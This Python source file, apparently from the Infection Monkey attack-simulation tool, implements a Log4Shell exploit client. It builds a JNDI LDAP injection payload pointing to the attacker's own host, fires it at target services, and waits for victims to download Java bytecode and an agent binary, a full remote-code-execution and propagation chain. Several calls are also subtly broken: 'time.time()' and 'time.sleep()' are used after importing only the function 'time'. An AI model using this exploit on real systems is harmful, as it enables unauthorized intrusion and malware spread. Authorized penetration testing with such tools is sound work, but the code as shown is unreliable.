import logging
from time import time
from typing import Set, Tuple

from timer import EggTimer

from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags import (
    BRUTE_FORCE_T1110_TAG,
    EXPLOITATION_FOR_CLIENT_EXECUTION_T1203_TAG,
    INGRESS_TOOL_TRANSFER_T1105_TAG,
)
from common.types import AgentID, Event, NetworkPort
from infection_monkey.i_puppet import TargetHost
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.threading import interruptible_iter

from .log4shell_options import Log4ShellOptions
from .log4shell_utils import get_log4shell_service_exploiters

logger = logging.getLogger(__name__)

LOG4SHELL_EXPLOITER_TAG = "log4shell-exploiter"
VICTIM_WAIT_SLEEP_TIME_SEC = 0.050
EXPLOITER_TAGS = (
    LOG4SHELL_EXPLOITER_TAG,
    BRUTE_FORCE_T1110_TAG,
    EXPLOITATION_FOR_CLIENT_EXECUTION_T1203_TAG,
)
PROPAGATION_TAGS = (
    LOG4SHELL_EXPLOITER_TAG,
    EXPLOITATION_FOR_CLIENT_EXECUTION_T1203_TAG,
    INGRESS_TOOL_TRANSFER_T1105_TAG,
)


class Log4ShellExploitClient:
    def __init__(
        self, exploiter_name: str, agent_id: AgentID, agent_event_publisher: IAgentEventPublisher
    ):
        self._exploiter_name = exploiter_name
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher

    def exploit_host(
        self,
        target_host: TargetHost,
        options: Log4ShellOptions,
        ldap_port: NetworkPort,
        agent_binary_downloaded: Event,
        exploit_class_downloaded: Event,
        url: str,
        command: str,
        ports_to_try: Set[NetworkPort],
        interrupt: Event,
    ) -> Tuple[bool, bool]:
        exploitation_success = False
        propagation_success = False
        try:
            exploitation_success, propagation_success = self._run_exploit(
                target_host,
                command,
                options,
                ldap_port,
                agent_binary_downloaded,
                exploit_class_downloaded,
                ports_to_try,
                interrupt,
            )
            exploitation_message = "" if exploitation_success else f"Failed to exploit via {url}"
        except Exception as err:
            logger.exception("An exception was encountered while attempting to exploit Log4Shell")
            exploitation_message = str(err)

        self._publish_exploitation_event(
            target_host, success=exploitation_success, error_message=exploitation_message
        )

        return exploitation_success, propagation_success

    def _run_exploit(
        self,
        target_host: TargetHost,
        command: str,
        options: Log4ShellOptions,
        ldap_port: NetworkPort,
        agent_binary_downloaded: Event,
        exploit_class_downloaded: Event,
        ports_to_try: Set[NetworkPort],
        interrupt: Event,
    ) -> Tuple[bool, bool]:
        exploitation_success = False
        propagation_success = False

        for service_exploit in get_log4shell_service_exploiters():
            for port in interruptible_iter(ports_to_try, interrupt):
                logger.debug(
                    f'Attempting Log4Shell exploit for service "{service_exploit.service_name}"'
                    f"on port {port}"
                )
                try:
                    timestamp = time.time()
                    service_exploit.trigger_exploit(
                        Log4ShellExploitClient._build_ldap_payload(target_host, ldap_port),
                        target_host,
                        port,
                    )
                    exploitation_success, propagation_success = self._propagate(
                        target_host,
                        timestamp,
                        options,
                        agent_binary_downloaded,
                        exploit_class_downloaded,
                    )
                except Exception as err:
                    error_message = (
                        "An error occurred while attempting to exploit Log4Shell on a "
                        f"potential {service_exploit.service_name} service: {err}"
                    )
                    logger.warning(error_message)
                    self._publish_exploitation_event(
                        target_host, timestamp, False, error_message=error_message
                    )

        return exploitation_success, propagation_success

    @staticmethod
    def _build_ldap_payload(target_host: TargetHost, ldap_port: NetworkPort) -> str:
        interface_ip = get_interface_to_target(str(target_host.ip))
        return f"${{jndi:ldap://{interface_ip}:{ldap_port}/dn=Exploit}}"

    def _propagate(
        self,
        target_host: TargetHost,
        timestamp: float,
        options: Log4ShellOptions,
        agent_binary_downloaded: Event,
        exploit_class_downloaded: Event,
    ) -> Tuple[bool, bool]:
        victim_called_back = Log4ShellExploitClient._wait_for_victim_to_download_java_bytecode(
            options.exploit_download_timeout, exploit_class_downloaded
        )
        victim_downloaded_agent = False
        if victim_called_back:
            self._publish_exploitation_event(target_host, timestamp, True)

            victim_downloaded_agent = Log4ShellExploitClient._wait_for_victim_to_download_agent(
                agent_binary_downloaded, options.agent_binary_download_timeout
            )
            self._publish_propagation_event(target_host, success=victim_downloaded_agent)
        else:
            error_message = "Timed out while waiting for victim to download the java bytecode"
            logger.debug(error_message)
            self._publish_exploitation_event(
                target_host, timestamp, False, error_message=error_message
            )

        return victim_called_back, victim_downloaded_agent

    @staticmethod
    def _wait_for_victim_to_download_java_bytecode(
        exploit_download_timeout: float, exploit_class_downloaded: Event
    ) -> bool:
        timer = EggTimer()
        timer.set(exploit_download_timeout)

        while not timer.is_expired():
            if exploit_class_downloaded():
                return True

            time.sleep(VICTIM_WAIT_SLEEP_TIME_SEC)

        return False

    @staticmethod
    def _wait_for_victim_to_download_agent(
        agent_binary_downloaded: Event, agent_binary_download_timeout: float
    ) -> bool:
        if agent_binary_downloaded.wait(agent_binary_download_timeout):
            return True

        # TODO: if the http server got an error we're waiting for nothing here
        time.sleep(VICTIM_WAIT_SLEEP_TIME_SEC)

        return False

    def _publish_exploitation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=self._exploiter_name,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or EXPLOITER_TAGS),
        )
        self._agent_event_publisher.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=self._exploiter_name,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or PROPAGATION_TAGS),
        )
        self._agent_event_publisher.publish(propagation_event)
